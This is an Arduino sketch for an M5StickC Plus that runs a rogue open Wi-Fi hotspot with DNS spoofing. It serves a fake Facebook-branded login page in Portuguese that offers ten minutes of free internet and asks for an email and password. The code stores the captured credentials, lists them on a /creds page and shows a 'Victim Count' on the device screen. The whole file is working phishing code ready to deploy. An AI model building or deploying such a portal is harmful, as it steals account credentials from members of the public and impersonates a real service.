#include <M5StickCPlus.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>


// Based on https://community.dfrobot.com/makelog-313463.html
// modified font and text placement for StickC-Plus, further improvements added

// User configuration
#define SSID_NAME "Wi-Fi 2G"
#define SUBTITLE "Wi-Fi Ilimitado por 10 minutos!"
#define TITLE "Entre"
#define BODY "Entre com sua conta para se conectar à internet!"
#define POST_TITLE "Validando..."
#define POST_BODY "Sua conta foi validada. Por favor, aguarde 5 minutos para conectarmos seu dispostivo."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

int capcount=0;
int previous=-1; // stupid hack but wtfe
int BUILTIN_LED = 10;

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String Credentials = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer; WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;"); a.replace(">", "&gt;");
  a.substring(0, 200); return a;
}

String footer() {
  return
    "</div><div class=q><a>&#169; Todos direitos reservados.</a></div>";
}

String header(String t) {
  String a = "Facebook";
  String CSS = "body { font-family: 'Arial', sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; }"
               "nav { background: #4267B2; color: #fff; padding: 1em; text-align: center; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; color: #1877f2; }"
               "article { background: #fff; padding: 1.3em; margin: 1em; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }"
               "input, textarea { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 4px; border: 1px solid #ccc; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; margin-bottom: 5px; }"
               "button { background-color: #1877f2; color: #fff; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b></nav><h1>" + t + "</h1><article>";
  return h;
}


String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  String formCSS = "form { max-width: 400px; margin: 0 auto; }"
                   "input[type=email], input[type=password] { width: 100%; padding: 10px; margin: 5px 0; box-sizing: border-box; }"
                   "input[type=submit] { background-color: #1877f2; color: #fff; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }"
                   "label { display: block; margin-bottom: 5px; color: #1877f2; }";

  String h = header("Login") + "<div>" + BODY + "</ol></div><div><form action=\"/post\" method=\"post\">" +
             "<label for=\"email\"><b>Email:</b></label><input type=\"email\" autocomplete=\"email\" name=\"email\" required></input>" +
             "<label for=\"password\"><b>Senha:</b></label><input type=\"password\" name=\"password\" required></input>" +
             "<center><input type=\"submit\" value=\"Logar\"></center></form></div>" +
             "<style>" + formCSS + "</style>" + footer();
  return h;
}

String posted() {
  String email = input("email");
  String password = input("password");
  Credentials = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  String email = "<p></p>";
  String password = "<p></p>";
  Credentials = "<p></p>";
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() { // The internal LED will blink 5 times when a password is received.
  int count = 0;
  while (count < 5) {
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}

void setup() {
  M5.begin();
  M5.Lcd.setRotation(3);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setSwapBytes(true);
  M5.Lcd.setTextSize(2);

  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)

  webServer.on("/post", []() {
    capcount=capcount+1;
    webServer.send(HTTP_CODE, "text/html", posted());
    M5.Beep.tone(4000);
    M5.Lcd.print("Victim Login");
    delay(50);
    M5.Beep.mute();
    BLINK();
    M5.Lcd.fillScreen(BLACK);
  });

  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());

  });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
    if(capcount > previous){
      previous = capcount;
    
      M5.Lcd.fillScreen(BLACK);
      M5.Lcd.setSwapBytes(true);
      M5.Lcd.setTextSize(2);
      M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
      M5.Lcd.setCursor(0, 10);
      M5.Lcd.print("CAPTIVE PORTAL");
      M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
      M5.Lcd.setCursor(0, 35);
      M5.Lcd.print("WiFi IP: ");
      M5.Lcd.println(APIP);
      M5.Lcd.printf("SSID: %s\n", SSID_NAME);
      M5.Lcd.printf("Victim Count: %d\n", capcount);
    }
  }
  dnsServer.processNextRequest(); webServer.handleClient();
}
